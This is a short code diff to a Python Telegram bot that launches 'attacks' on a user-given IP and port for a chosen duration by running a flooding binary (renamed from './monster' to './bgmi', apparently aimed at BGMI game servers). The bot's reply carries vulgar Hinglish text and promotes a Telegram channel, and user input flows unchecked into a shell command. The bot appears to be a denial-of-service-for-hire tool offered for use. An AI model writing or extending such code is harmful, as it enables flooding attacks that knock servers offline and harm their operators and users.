@@ -134,7 +134,7 @@ async def run_attack(chat_id, ip, port, duration, context):
     attack_in_progress = True
 
     try:
-        command = f"./monster {ip} {port} {duration} 200"
+        command = f"./bgmi {ip} {port} {duration} 200"
         process = await asyncio.create_subprocess_shell(
             command,
             stdout=asyncio.subprocess.PIPE,
@@ -191,7 +191,7 @@ async def attack(update: Update, context: CallbackContext):
         f"*⚔️ ᴷᵃʳᵃᵗ ᵏᵃʳᵃᵗ ᶜʰᵘᵈᵃⁱ ˢᵉ ˡᵘⁿᵈ ʰᵒᵃᵗ ᵇᵃˡʷᵃⁿ....ᶜʰᵘᵗ ᵐᵉ ᵃʷᵃᵗ ʲᵃᵃᵗ ˢᵉ ˡᵘⁿᵈ ᵇᵃⁿᵉ ᵐᵃʰᵃᵃⁿ😁 ⚔️*\n"
         f"*🎯 Target: {ip}:{port}*\n"
         f"*🕒 Duration: {duration} seconds*\n"
-        f"*🔥 Join :- https://t.me/bgmiindiaofficial1💥*"
+        f"*🔥 Join :- https://t.me/bgmiindiaofficial1 💥*"
     ), parse_mode='Markdown')
 
     asyncio.create_task(run_attack(chat_id, ip, port, duration, context))
